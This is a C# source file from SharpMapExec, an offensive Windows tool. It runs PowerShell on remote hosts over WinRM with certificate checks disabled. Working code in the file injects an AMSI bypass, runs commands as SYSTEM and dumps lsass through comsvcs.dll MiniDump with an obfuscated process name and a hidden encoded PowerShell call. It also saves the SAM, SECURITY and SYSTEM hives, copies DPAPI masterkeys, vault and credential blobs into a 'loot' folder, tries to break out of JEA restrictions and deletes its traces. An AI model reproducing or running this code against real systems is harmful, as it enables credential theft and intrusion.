using SharpMapExec.Helpers;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading;
using static SharpMapExec.Helpers.SecurityContext;
using static SharpMapExec.Helpers.Misc;

namespace SharpMapExec.Lib
{
    public class Wsman
    {
        
        public static (Collection<PSObject>, Collection<ErrorRecord>) InvokeJeaCommand(string computer, string command, string auth = "ntlm", string scheme = "HTTP", bool display = true)
        {
            Collection<PSObject> result = new Collection<PSObject>();
            Collection<ErrorRecord> error = new Collection<ErrorRecord>();
            var remoteComputer = new Uri(String.Format("{0}://{1}:5985/wsman", scheme, computer));
            var connection = new WSManConnectionInfo(remoteComputer);
            connection.SkipRevocationCheck = true;
            connection.SkipCNCheck = true;
            connection.SkipCACheck = true;
            if (auth == "kerberos")
            {
                connection.AuthenticationMechanism = AuthenticationMechanism.Kerberos;
            }
            else
            {
                connection.AuthenticationMechanism = AuthenticationMechanism.Negotiate;
            }
            try
            {
                using (Runspace runspace = RunspaceFactory.CreateRunspace(connection))
                {
                    runspace.Open();
                    using (var powershell = PowerShell.Create())
                    {
                        powershell.Runspace = runspace;
                        if (String.IsNullOrEmpty(command))
                        {
                            powershell.AddCommand("get-command").AddParameter("Name", "*");
                        }
                        else
                        {
                            powershell.AddCommand("get-command").AddParameter("Name", command).AddParameter("showcommandinfo");
                        }
                        result = powershell.Invoke();
                        error = powershell.Streams.Error.ReadAll();
                    }
                }
            }
            catch (System.Management.Automation.Remoting.PSRemotingTransportException e) // Connecting to remote server 192.168.1.10 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic
            {
                Console.WriteLine(String.Format("[-] Access is Denied on {0}", connection.ComputerName));
                throw e;
            }
            catch (System.Management.Automation.RemoteException e) //The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode
            {
                throw e;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                throw e;
            }
            if (display)
            {
                foreach (var err in error)
                {
                    Console.WriteLine(err);
                }
            }
            return (result, error);
        }

        public static (Collection<PSObject>, Collection<ErrorRecord>) InvokeCommand(string computer, string argument, bool AsSystem = false, string auth = "ntlm", string scheme = "HTTP", bool display = true, bool AmsiBypass = false, bool delegWalk = false)
        {
            Collection<PSObject> result = new Collection<PSObject>();
            Collection<ErrorRecord> error = new Collection<ErrorRecord>();
            var remoteComputer = new Uri(String.Format("{0}://{1}:5985/wsman", scheme, computer));
            var connection = new WSManConnectionInfo(remoteComputer);
            connection.SkipRevocationCheck = true;
            connection.SkipCNCheck = true;
            connection.SkipCACheck = true;

            if (auth == "kerberos")
            {
                connection.AuthenticationMechanism = AuthenticationMechanism.Kerberos;
            }
            else
            {
                connection.AuthenticationMechanism = AuthenticationMechanism.Negotiate;
            }
            if (AsSystem)
            {
                argument = PsFunction.RunAsSystem(argument);
            }
            if (delegWalk)
            {
                argument = PsFunction.RunDelegationWalk(argument);
            }
            try
            {
                using (Runspace runspace = RunspaceFactory.CreateRunspace(connection))
                {
                    runspace.Open();
                    using (var powershell = PowerShell.Create())
                    {
                        powershell.Runspace = runspace;
                        powershell.AddScript("if(get-module psreadline -all){remove-module psreadline -Force}");
                        if (AmsiBypass)
                        {
                            string amsi = AmsiFail.GetPayload();
                            powershell.AddScript(amsi);
                        }
                        powershell.AddScript(argument);
                        result = powershell.Invoke();
                        error = powershell.Streams.Error.ReadAll();
                    }
                }
            }
            catch (System.Management.Automation.Remoting.PSRemotingTransportException e) // Connecting to remote server 192.168.1.10 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic
            {
                Console.WriteLine(String.Format("[-] Access is Denied on {0}", connection.ComputerName));
                throw e;
            }
            catch (System.Management.Automation.RemoteException e) //The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode
            {
                if (e.Message.Contains("The syntax is not supported by this runspace"))
                    Console.WriteLine(String.Format("[-] Jea Endpoint Detected on {0}", connection.ComputerName));
                else
                    Console.WriteLine(e.Message);
                throw e;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                throw e;
            }
            if (display)
            {
                foreach (var err in error)
                {
                    Console.WriteLine(err);
                }
            }
            return (result, error);
        }

        public static void CopyFileSession(string computer, string path, string destination, bool delete = false, string auth = "ntlm", string scheme = "HTTP")
        {
            if (auth != "kerberos")
            {
                auth = "Negotiate";
            }
            try
            {
                using (PowerShell powershell = PowerShell.Create())
                {
                    powershell.AddScript(string.Format(@"$s=New-PsSession -computername {0} -Authentication {3} ; copy-item -Path {1} -Destination {2} -FromSession $s", computer, path, destination, auth));
                    powershell.Invoke();
                    if (powershell.HadErrors)
                    {
                        Console.WriteLine("  [-] Failed to Copy File From Remote Host");
                        return;
                    }
                    else
                    {
                        Console.WriteLine(String.Format("  [+] File copied to {0}", destination));
                    }
                    if (delete)
                    {
                        try
                        {
                            InvokeCommand(computer, String.Format("remove-item {0} -force", path), false, auth);
                        }
                        catch
                        {
                            Console.WriteLine(String.Format("  [-] Failed to delete {0}", path));
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void CopyFileSession(string computer, string path, string destination, string username, string domain, string Ntlmhash, bool delete = false)
        {
            string argument = string.Format(@"$s=New-PsSession -computername {0} -Authentication Negotiate ; copy-item -Path {1} -Destination {2} -FromSession $s", computer, path, destination);
            int procid = CreateNtlmPowershell(username, domain, Ntlmhash, argument);
            try
            {
                Process process = Process.GetProcessById(procid);
                while (!process.HasExited && process.Responding)
                {
                    Thread.Sleep(1000);
                }
                if (String.IsNullOrEmpty(process.ProcessName) || !File.Exists(destination))
                {
                    Console.WriteLine("  [-] Failed to Copy File From Remote Host");
                    return;
                }
                else
                {
                    Console.WriteLine(String.Format("  [+] Lsass Dump Copied to {0}", destination));
                }
            }
            catch
            {
                Console.WriteLine("  [-] Failed to Copy File From Remote Host");
            }
        }

        public static void UploadFile(string computer, string path, string destination, string auth = "ntlm", string scheme = "http")
        {
            if (auth != "kerberos")
            {
                auth = "Negotiate";
            }
            try
            {
                byte[] binary = File.ReadAllBytes(path);
                string data = Compress(binary);
                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, PsFunction.UploadFile(data, destination), false, auth, scheme, true);
                foreach (PSObject obj in result)
                {
                    if (obj.ToString().Length == 0)
                    {
                        Console.WriteLine("  [-] Upload Failed");
                        return;
                    }
                }
                Console.WriteLine(String.Format("  [+] Copied {0}kb to {1}", binary.ToArray().Length, destination));
            }
            catch (Exception e) // Connecting to remote server 192.168.1.10 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void UploadContent(string computer, string content, string destination, string auth = "ntlm", string scheme = "http")
        {
            if (auth != "kerberos")
            {
                auth = "Negotiate";
            }
            try
            {
                string data = Compress(Encoding.ASCII.GetBytes(content));
                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, PsFunction.UploadFile(data, destination), false, auth, scheme, true);
                foreach (PSObject obj in result)
                {
                    if (obj.ToString().Length == 0)
                    {
                        Console.WriteLine("  [-] Upload Failed");
                    }
                }
            }
            catch (Exception e) // Connecting to remote server 192.168.1.10 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void CopyFile(string computer, string path, string destination, bool delete = false, string auth = "ntlm", string scheme = "http", bool parseLsass = false)
        {
            if (auth != "kerberos")
            {
                auth = "Negotiate";
            }
            try
            {
                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, PsFunction.CopyFile(path), false, auth, scheme, true);
                foreach (PSObject obj in result)
                {
                    if (obj.ToString().Length == 0)
                    {
                        Console.WriteLine("  [-] Copy Failed");
                    }
                    else
                    {
                        byte[] compressfile = Convert.FromBase64String(obj.ToString());
                        byte[] data = Decompress(compressfile);
                        if (parseLsass)
                        {
                            Minidump.Program.parse(data);
                        }
                        File.WriteAllBytes(destination, data.ToArray());
                        Console.WriteLine(String.Format("  [+] Copied {0}kb to {1}", data.ToArray().Length, destination));
                    }
                }
                if (delete)
                {
                    try
                    {
                        (Collection<PSObject> result2, Collection<ErrorRecord> errors2) = InvokeCommand(computer, String.Format("if(test-path {0}){{remove-item {0} -force}}", path), false, auth, scheme);
                    }
                    catch
                    {
                        Console.WriteLine(String.Format("  [-] Failed to delete {0}", path));
                    }
                }
            }
            catch (Exception e) // Connecting to remote server 192.168.1.10 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void ExecuteAssembly(string computer, string path, string argument, List<string> flags, string auth = "ntlm", string scheme = "HTTP")
        {
            Console.WriteLine("[*] Executing Assembly");
            string caller;
            string randomPath = "C:\\windows\\temp\\" + Guid.NewGuid().ToString() + ".ps1";
            string command = PsFunction.ExecuteAssembly(path, argument);

            if (flags.Contains("system"))
            {
                caller = PsFunction.RunAsSystem(command);
            }
            else if (flags.Contains("delegwalk"))
            {
                caller = PsFunction.RunDelegationWalk(command);
            }
            else
            {
                caller = command;
            }

            //Console.WriteLine(command);
            //Console.WriteLine(caller);

            try
            {
                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, caller, false, auth, scheme);
                foreach (var obj in result)
                {
                    Console.WriteLine(obj.ToString());
                }
                if (errors.Count > 0)
                {
                    Console.WriteLine("[-] Error While Executing Assembly");
                    return;
                }
                //delete uploaded ps file
                if (caller != command)
                {
                    try
                    {
                        (Collection<PSObject> result2, Collection<ErrorRecord> errors2) = InvokeCommand(computer, String.Format("if(test-path {0}){{remove-item {0} -force}}", randomPath), false, auth, scheme);
                    }
                    catch
                    {
                        Console.WriteLine(String.Format("  [-] Failed to delete {0}", randomPath));
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Failed While Executing Assembly");
                Console.WriteLine(e);
                return;
            }
        }

        public static void InvokeComSvcsLsassDump(string computer, string auth = "ntlm", string scheme = "HTTP")
        {
            Console.WriteLine("[*] Dumping lsass");
            string path = "C:\\Windows\\temp\\" + Guid.NewGuid().ToString() + ".dmp";
            string ecmd = string.Format(@"C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process ('l'+'s'+'a'+'s'+'s')).Id {0} full", path);
            string argument = string.Format(@"start-process powershell -WindowStyle Hidden -ArgumentList '-NoP -enc {0} ' -wait ; test-path {1}", Convert.ToBase64String(Encoding.Unicode.GetBytes(ecmd)), path);
            //string argument = "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\windows\\temp\\Coredump.dmp full; Wait-Process rundll32";
            string destination = Path.Combine("loot", computer, "lsass.dmp");
            if (!Directory.Exists(Path.Combine("loot", computer)))
            {
                Directory.CreateDirectory(Path.Combine("loot", computer));
            }
            try
            {
                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, argument, false, auth, scheme);
                if (errors.Count > 0)
                {
                    Console.WriteLine("[-] Failed to Dump Lsass");
                    throw new Exception();
                }
                if(result[0].ToString() == "False")
                {
                    Console.WriteLine("[-] Failed to Dump Lsass");
                    throw new Exception();
                }
                try
                {
                    Console.WriteLine("[*] Copying lsass dump");
                    CopyFile(computer, path, destination, true, parseLsass: true);
                    return;
                }
                catch
                {
                    Console.WriteLine("[-] Failed to Copy Lsass Dump File");
                }
            }
            catch
            {
                Console.WriteLine("[-] Failed to Dump Lsass");
            }
            try
            {
                (Collection<PSObject> result2, Collection<ErrorRecord> errors2) = InvokeCommand(computer, String.Format("if(test-path {0}){{remove-item {0} -force}}", path), false, auth, scheme);
            }
            catch
            {
                Console.WriteLine(String.Format("  [-] Failed to delete {0}", path));
            }
        }

        public static void GetSecrets(string computer, string auth = "ntlm", string scheme = "HTTP")
        {
            Console.WriteLine("[*] Dumping hives");
            string argument = @"C:\Windows\system32\reg.exe save hklm\security C:\windows\temp\sec /y ; C:\Windows\system32\reg.exe save hklm\sam C:\windows\temp\sam /y ; C:\Windows\system32\reg.exe save hklm\system C:\windows\temp\sys /y";
            string destination = Path.Combine("loot", computer);
            string sam = Path.Combine(destination, "sam.hive");
            string sys = Path.Combine(destination, "system.hive");
            string sec = Path.Combine(destination, "security.hive");
            if (!Directory.Exists(Path.Combine("loot", computer)))
            {
                Directory.CreateDirectory(Path.Combine("loot", computer));
            }

            //Get registry hives
            try
            {
                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, argument, false, auth, scheme);
                if (errors.Count > 0)
                {
                    return;
                }
            }
            catch
            {
                Console.WriteLine("  [-] Failed to Dump Hives");
                return;
            }
            try
            {
                CopyFile(computer, "C:\\Windows\\temp\\sam", sam, true);
                CopyFile(computer, "C:\\Windows\\temp\\sec", sec, true);
                CopyFile(computer, "C:\\Windows\\temp\\sys", sys, true);
            }
            catch
            {
                Console.WriteLine("  [-] Failed to Copy Hives");
                return;
            }

            //Get masterkeys
            string sysmasterkeysDir = Path.Combine(destination, "sysmasterkeys");
            string usermasterkeysDir = Path.Combine(destination, "usermasterkeys");
            Directory.CreateDirectory(sysmasterkeysDir);
            Directory.CreateDirectory(usermasterkeysDir);
            List<byte[]> machineMasterKeyList = new List<byte[]>();
            List<byte[]> userMasterKeyList = new List<byte[]>();

            Console.WriteLine("[*] Dumping masterkeys");
            argument = @"(gci $env:HOMEDRIVE\Windows\System32\Microsoft\Protect\S-1-5-18\ -Filter '*-*' -force).fullname";
            (Collection<PSObject> machineMasterKeys, Collection<ErrorRecord> errors2) = InvokeCommand(computer, argument, false, auth, scheme, true);
            Console.WriteLine(String.Format("[*] System Masterkeys Found: {0}", machineMasterKeys.Count));
            foreach (PSObject item in machineMasterKeys)
            {
                string dest = Path.Combine(sysmasterkeysDir, item.ToString().Split('\\').Last());
                CopyFile(computer, item.ToString(), dest, false);
                machineMasterKeyList.Add(File.ReadAllBytes(dest));
            }
            argument = @"(gci $env:HOMEDRIVE\Windows\System32\Microsoft\Protect\S-1-5-18\user -Filter '*-*' -force).fullname";
            (Collection<PSObject> userMasterKeys, Collection<ErrorRecord> errors3) = InvokeCommand(computer, argument, false, auth, scheme, true);
            Console.WriteLine(String.Format("[*] User Masterkeys Found: {0}", userMasterKeys.Count));
            foreach (PSObject item in userMasterKeys)
            {
                string dest = Path.Combine(usermasterkeysDir, item.ToString().Split('\\').Last());
                CopyFile(computer, item.ToString(), dest, false);
                userMasterKeyList.Add(File.ReadAllBytes(dest));
            }

            //Get blobs
            Console.WriteLine("[*] Dumping blobs");
            string vaultDir = Path.Combine(destination, "vault");
            string credDir = Path.Combine(destination, "cred");
            string certDir = Path.Combine(destination, "cert");
            Directory.CreateDirectory(vaultDir);
            Directory.CreateDirectory(credDir);
            Directory.CreateDirectory(certDir);
            (Collection<PSObject> systemvaultdir, Collection<ErrorRecord> systemvauldirterror) = InvokeCommand(computer, PsFunction.FindSystemVault(), false, auth, scheme, true);
            int i = 0;
            Console.WriteLine(String.Format("[*] System Vault Found: {0}", systemvaultdir.Count));
            foreach (PSObject folder in systemvaultdir)
            {
                i++;
                string dest = Path.Combine(vaultDir, folder.ToString().Split('\\').Last());
                Directory.CreateDirectory(dest);
                argument = String.Format("(Get-ChildItem -force {0}).fullname", folder.ToString());
                (Collection<PSObject> systemvault, Collection<ErrorRecord> systemvaulterror) = InvokeCommand(computer, argument, false, auth, scheme, true);
                foreach (PSObject item in systemvault)
                {
                    CopyFile(computer, item.ToString(), Path.Combine(dest, item.ToString().Split('\\').Last()), false);
                }
            }
            (Collection<PSObject> systemcred, Collection<ErrorRecord> systemcrederror) = InvokeCommand(computer, PsFunction.FindSystemCred(), false, auth, scheme, true);
            Console.WriteLine(String.Format("[*] System Cred Found: {0}", systemcred.Count));
            i = 0;
            foreach (PSObject item in systemcred)
            {
                i++;
                string dest = Path.Combine(credDir, item.ToString().Split('\\').Last() + "-" + i.ToString());
                CopyFile(computer, item.ToString(), dest, false);
            }
            i = 0;
            (Collection<PSObject> systemcert, Collection<ErrorRecord> systemcerterror) = InvokeCommand(computer, PsFunction.FindSystemCert(), false, auth, scheme, true);
            Console.WriteLine(String.Format("[*] System Cert Found: {0}", systemcert.Count));
            foreach (PSObject item in systemcert)
            {
                i++;
                string dest = Path.Combine(certDir, item.ToString().Split('\\').Last());
                CopyFile(computer, item.ToString(), dest, false);
            }

            Secrets.ParseSecrets(sam, sys, sec, machineMasterKeyList, userMasterKeyList, credDir, vaultDir, certDir);
        }

        public static void InvokeJeaLanguageBypass(string computer, string auth = "ntlm", string scheme = "HTTP")
        {
            Console.WriteLine("[*] Trying Language Bypass");
            string argument = @"function test { Test-Path C:\Users\administrator\desktop } ; test";
            StringBuilder stringBuilder = new StringBuilder();
            (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, argument, false, auth, scheme, false);
            foreach (PSObject obj in result)
            {
                stringBuilder.AppendLine(obj.ToString());
            }
            if (stringBuilder.ToString().Contains("True"))
            {
                Console.WriteLine("  [+] Language Bypass Successful");
                Console.WriteLine(String.Format("  [+] Local Admin on {0}", computer));
                return;
            }
            else if (stringBuilder.ToString().Contains("False"))
            {
                Console.WriteLine("  [+] Language Bypass Successful");
                Console.WriteLine(String.Format("  [+] Authenticated But Not Admin on {0}", computer));
                return;
            }
            else
            {
                Console.WriteLine(string.Format("  [-] Jea is In NoLanguage Mode on {0}", computer));
            }
        }

        public static void InvokeJeaCommandBypass(string computer, string auth = "ntlm", string scheme = "HTTP")
        {
            Console.WriteLine("[*] Trying Command Bypass");
            List<string> defaultcommands = new List<string> {
                "Clear-Host", "Exit-PSSession", "Get-Command", "Get-FormatData", "Get-Help", "Measure-Object",
                "Out-Default", "Select-Object", "select", "measure", "gcm", "exsn", "cls", "clear"
            };
            StringBuilder stringBuilder = new StringBuilder();
            (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeJeaCommand(computer, null, auth, scheme);
            foreach (PSObject obj in result)
            {
                string command = obj.Properties["Name"].Value.ToString();
                if (!defaultcommands.Contains(command))
                {
                    Console.WriteLine(String.Format("[+] Non Default Jea Command Found: {0}", command));
                    (Collection<PSObject> newresult, Collection<ErrorRecord> errors2) = InvokeJeaCommand(computer, command, auth, scheme);
                    foreach (PSObject newobj in newresult)
                    {
                        var sourcecode = newobj.Properties["Definition"].Value.ToString();
                        Jea.RunAllChecks(sourcecode);
                        Console.WriteLine("--- SourceCode ---" + sourcecode + "---  end ---");
                    }
                }
            }
            if (!String.IsNullOrEmpty(stringBuilder.ToString()))
            {
                Console.WriteLine(stringBuilder.ToString());
            }
        }

        public static void CheckLocalAdmin(string computer, string argument, List<string> flags, string auth = "ntlm", string scheme = "HTTP")
        {
            bool checkadmin = false;
            StringBuilder stringBuilder = new StringBuilder();
            bool AsSystem = false;
            bool delegWalk = false;
            bool DisableAmsi = false;

            if (flags.Contains("system"))
            {
                AsSystem = true;
            }
            else if (flags.Contains("delegwalk"))
            {
                delegWalk = true;
            }
            if (argument.Length == 0)
            {
                argument = "(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)";
                checkadmin = true;
            }
            else
            {
                DisableAmsi = true;
            }
            try
            {
                (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, argument, AsSystem, auth, scheme, false, DisableAmsi, delegWalk: delegWalk);
                foreach (PSObject obj in result)
                {
                    stringBuilder.AppendLine(obj.ToString());
                }
                if (stringBuilder.ToString().Contains("True") && checkadmin)
                {
                    Console.WriteLine(String.Format("  [+] Local Admin on {0}", computer));
                }
                else if (stringBuilder.ToString().Contains("False") && checkadmin)
                {
                    Console.WriteLine(String.Format("  [+] Authenticated But Not Admin on {0}", computer));
                }
                else if (stringBuilder.ToString().Length == 0 && checkadmin)
                {
                    Console.WriteLine(String.Format("[-] Possible JEA Endpoint on {0}", computer));
                    InvokeJeaLanguageBypass(computer, auth, scheme);
                    return;
                }
                else if (stringBuilder.ToString().Length == 0)
                {
                    Console.WriteLine(String.Format("[-] No Stdout Received From {0}", computer));
                }
                else
                {
                    Console.WriteLine(string.Format("  [+] Received Stdout From {0}", computer));
                    Console.WriteLine(stringBuilder.ToString());
                }
                foreach (var error in errors)
                {
                    Console.WriteLine(error);
                }
            }
            catch (System.Management.Automation.Remoting.PSRemotingTransportException e) // Connecting to remote server 192.168.1.10 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic
            {
                //
            }
            catch (System.Management.Automation.RemoteException e)
            {
                if (e.Message.Contains("The syntax is not supported by this runspace"))
                    InvokeJeaCommandBypass(computer, auth, scheme);
            }
            catch (Exception e)
            {
                //
            }
        }
    }
}